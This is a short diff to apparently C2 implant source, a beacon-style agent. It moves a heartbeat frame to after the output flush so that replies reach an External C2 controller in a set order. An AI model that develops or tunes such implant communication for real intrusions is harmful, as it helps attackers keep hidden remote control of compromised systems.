@@ -180,12 +180,13 @@ void client_process() {
 		if (check_kill_date())
 			command_die(command_shell_callback);
 
-		/* emit a zero-length frame so the parent (an External C2 controller,
-		 * or a pivot parent) sees we are alive and advances its loop; the
-		 * official beacon does the same from its flush stage. */
-		LCHANNEL_WRITE_FRAME(server, (char *)"", 0);
-
 		client_flush();
+
+		/* emit a zero-length frame AFTER the output frames so the reply
+		 * order is deterministic: [outputs...][heartbeat]. A controller
+		 * drains outputs until the heartbeat; putting the heartbeat first
+		 * wedges queued outputs behind it. */
+		LCHANNEL_WRITE_FRAME(server, (char *)"", 0);
 
 		if (sleep_time == 0)
 			return;
